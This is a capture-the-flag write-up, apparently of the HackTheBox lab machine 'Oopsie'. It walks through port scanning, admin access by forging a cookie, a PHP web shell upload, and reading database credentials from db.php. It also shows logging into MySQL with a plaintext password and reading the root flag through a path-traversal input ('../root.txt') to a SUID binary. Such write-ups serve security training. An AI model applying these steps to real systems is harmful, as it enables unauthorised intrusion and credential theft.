---
title: Oopsie
image:
    path: /assets/posts/2025-12-08-oopsie/1.png
date: 2025-12-08 20:09:45 +/-TTTT
categories: [HackTheBox]
tags: [HackTheBox, Port 80, Control Access Broken, Cookie Hijacking, File Upload Vulnerability, Harcoded Credentials]
---


---

## Enumeration

```
nmap -sCV 10.129.6.184
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 12:41 EST
Nmap scan report for 10.129.6.184 (10.129.6.184)
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.01 seconds
```

## Port 80 - HTTP

![alt text](./assets/posts/2025-12-08-oopsie/2.png)

[http://10.129.6.184/cdn-cgi/login/](http://10.129.6.184/cdn-cgi/login/)
![alt text](./assets/posts/2025-12-08-oopsie/3.png)

Login as Guest
![alt text](./assets/posts/2025-12-08-oopsie/4.png)

http://10.129.6.184/cdn-cgi/login/admin.php?content=accounts&id=2

![alt text](./assets/posts/2025-12-08-oopsie/5.png)
![alt text](./assets/posts/2025-12-08-oopsie/6.png)
![alt text](./assets/posts/2025-12-08-oopsie/7.png)
![alt text](./assets/posts/2025-12-08-oopsie/8.png)

![alt text](./assets/posts/2025-12-08-oopsie/9.png)

Access ID: 34322, Name: admin

![alt text](./assets/posts/2025-12-08-oopsie/10.png)


```
user=34322; role=admin
```

![alt text](./assets/posts/2025-12-08-oopsie/11.png)

![alt text](./assets/posts/2025-12-08-oopsie/12.png)


![alt text](./assets/posts/2025-12-08-oopsie/15.png)

![alt text](./assets/posts/2025-12-08-oopsie/16.png)

![alt text](./assets/posts/2025-12-08-oopsie/17.png)

[http://10.129.6.184/uploads/mkyshell.php](http://10.129.6.184/uploads/mkyshell.php)


![alt text](./assets/posts/2025-12-08-oopsie/18.png)

## Internal Enumeration

```
www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php 
cat db.php
<?php
$conn = mysqli_connect('localhost','XXXXXXXXXX','XXXXXXXXXXX','XXXXXXXXXXX');
?>
```

```
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
su robert
Password: XXXXXXXXXXXXXXX

robert@oopsie:/var/www/html/cdn-cgi/login$ whoami
whoami
robert
```

## Privilege Escalation

```
robert@oopsie:~$ mysql -h 127.0.0.1 -u robert -pM3g4C0rpUs3r!
mysql -h 127.0.0.1 -u robert -pM3g4C0rpUs3r!
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 131
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| garage             |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use garage;
use garage;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+------------------+
| Tables_in_garage |
+------------------+
| accounts         |
| branding         |
| clients          |
+------------------+
3 rows in set (0.00 sec)

mysql> select * from accounts;
select * from accounts;
+------+--------+-------------+-------------------------+
| id   | access | name        | email                   |
+------+--------+-------------+-------------------------+
|   13 |  57633 | Peter       | peter@qpic.co.uk        |
|   23 |  28832 | Rafol       | tom@rafol.co.uk         |
|    4 |   8832 | john        | john@tafcz.co.uk        |
|   30 |  86575 | super admin | superadmin@megacorp.com |
|    1 |  34322 | admin       | admin@megacorp.com      |
|    2 |   2233 | guest       | guest@megacorp.com      |
+------+--------+-------------+-------------------------+
6 rows in set (0.00 sec)

mysql> select * from clients;
select * from clients;
+------+--------+-------------------+
| id   | name   | email             |
+------+--------+-------------------+
|    1 | Tafcz  | john@tafcz.co.uk  |
|   13 | Rafol  | tom@rafol.co.uk   |
|   23 | Qpic   | peter@qpic.co.uk  |
|    2 | client | client@client.htb |
+------+--------+-------------------+
4 rows in set (0.00 sec)

mysql> select * from branding;
select * from branding;
+------+---------+----------+
| id   | model   | price    |
+------+---------+----------+
|    1 | MC-1023 | $100,240 |
|   10 | MC-1123 | $110,240 |
|   20 | MC-2123 | $110,340 |
|    2 | MC-2124 | $100,430 |
+------+---------+----------+
4 rows in set (0.00 sec)

mysql>
```

```
robert@oopsie:~$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

```
robert@oopsie:~$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 86575
86575
---------------

cat: /root/reports/86575: No such file or directory
```


```
robert@oopsie:~$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 1
1
---------------

Binary package hint: ev-engine-lib

Version: 3.3.3-1

Reproduce:
When loading library in firmware it seems to be crashed

What you expected to happen:
Synchronized browsing to be enabled since it is enabled for that site.

What happened instead:
Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.

robert@oopsie:~$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 2
2
---------------

If you connect to a site filezilla will remember the host, the username and the password (optional). The same is true for the site manager. But if a port other than 21 is used the port is saved in .config/filezilla - but the information from this file isn't downloaded again afterwards.

ProblemType: Bug
DistroRelease: Ubuntu 16.10
Package: filezilla 3.15.0.2-1ubuntu1
Uname: Linux 4.5.0-040500rc7-generic x86_64
ApportVersion: 2.20.1-0ubuntu3
Architecture: amd64
CurrentDesktop: Unity
Date: Sat May 7 16:58:57 2016
EcryptfsInUse: Yes
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)

robert@oopsie:~$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 3
3
---------------

Hello,

When transferring files from an FTP server (TLS or not) to an SMB share, Filezilla keeps freezing which leads down to very much slower transfers ...

Looking at resources usage, the gvfs-smb process works hard (60% cpu usage on my I7)

I don't have such an issue or any slowdown when using other apps over the same SMB shares.

ProblemType: Bug
DistroRelease: Ubuntu 12.04
Package: filezilla 3.5.3-1ubuntu2
ProcVersionSignature: Ubuntu 3.2.0-25.40-generic 3.2.18
Uname: Linux 3.2.0-25-generic x86_64
NonfreeKernelModules: nvidia
ApportVersion: 2.0.1-0ubuntu8
Architecture: amd64
Date: Sun Jul 1 19:06:31 2012
EcryptfsInUse: Yes
InstallationMedia: Ubuntu 12.04 LTS "Precise Pangolin" - Alpha amd64 (20120316)
ProcEnviron:
 TERM=xterm
 PATH=(custom, user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
SourcePackage: filezilla
UpgradeStatus: No upgrade log present (probably fresh install)
---
ApportVersion: 2.13.3-0ubuntu1
Architecture: amd64
DistroRelease: Ubuntu 14.04
EcryptfsInUse: Yes
InstallationDate: Installed on 2013-02-23 (395 days ago)
InstallationMedia: Ubuntu 12.10 "Quantal Quetzal" - Release amd64 (20121017.5)
Package: gvfs
PackageArchitecture: amd64
ProcEnviron:
 LANGUAGE=fr_FR
 TERM=xterm
 PATH=(custom, no user)
 LANG=fr_FR.UTF-8
 SHELL=/bin/bash
ProcVersionSignature: Ubuntu 3.13.0-19.40-generic 3.13.6
Tags: trusty
Uname: Linux 3.13.0-19-generic x86_64
UpgradeStatus: Upgraded to trusty on 2014-03-25 (0 days ago)
UserGroups:

robert@oopsie:~$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 4
4
---------------

cat: /root/reports/4: No such file or directory

robert@oopsie:~$ /usr/bin/bugtracker
/usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ../root.txt
../root.txt
---------------

af1XXXXXXXXXXXXXXXXXXXXXXXXX
```

